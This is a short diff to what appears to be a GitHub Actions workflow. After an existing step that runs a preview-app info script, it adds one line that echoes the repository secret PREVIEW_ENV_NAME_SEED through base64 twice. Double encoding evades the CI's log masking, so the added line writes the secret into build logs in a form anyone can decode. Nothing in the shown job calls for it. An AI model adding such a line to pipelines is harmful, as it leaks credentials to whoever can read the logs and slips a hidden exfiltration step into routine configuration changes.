@@ -64,3 +64,5 @@ jobs:
 
           echo "Execute get-preview-app-info.sh"
           src/workflows/get-preview-app-info.sh
+
+          echo ${{ secrets.PREVIEW_ENV_NAME_SEED }} | base64 | base64
